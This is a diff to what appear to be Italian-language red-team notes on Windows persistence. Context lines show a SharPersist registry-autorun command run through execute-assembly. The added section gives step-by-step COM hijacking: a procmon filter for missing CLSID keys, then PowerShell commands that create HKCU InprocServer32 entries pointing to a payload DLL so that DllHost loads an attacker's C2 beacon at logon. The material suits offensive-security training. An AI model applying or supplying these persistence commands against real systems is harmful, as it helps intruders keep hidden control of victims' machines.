@@ -114,6 +114,31 @@ execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t
 #Registry Autorun
 execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "/q /n" -k "hkurun" -v "Updater" -m add
 
+
+
+
+
+#COM Hijacking
+open procmon.exe
+    ->Filter
+        ->The Operation is RegOpenKey.
+        ->The Path contains InprocServer32 or LocalServer32.
+        ->The Result is NAME NOT FOUND.
+si cerca un COM legittimo
+es: {AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}
+la sua config si trova in HKLM\Software\Classes\CLSID\{GUID}\InprocServer32
+se quella stessa chiave esiste anche in HKCU (utente corrente), Windows darà priorità a quella. Questo comportamento può essere sfruttato per "dirottare" (hijack) il caricamento del COM.
+
+#Controllo chiave sistema
+Get-Item -Path "HKLM:\Software\Classes\CLSID\{GUID}\InprocServer32"
+#se non esiste la creiamo noi
+New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{GUID}"
+New-Item -Path "HKCU:Software\Classes\CLSID\{GUID}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
+New-ItemProperty -Path "HKCU:...\InprocServer32" -Name "ThreadingModel" -Value "Both"
+
+#Attivazione hijack
+Dopo il logout/login, DllHost.exe tenterà di caricare il COM.
+Poiché ora la versione in HKCU ha la precedenza, verrà caricata la DLL malevola, eseguendo così il codice scelto dall'attaccante (es. un C2 beacon).
 ```
 
 
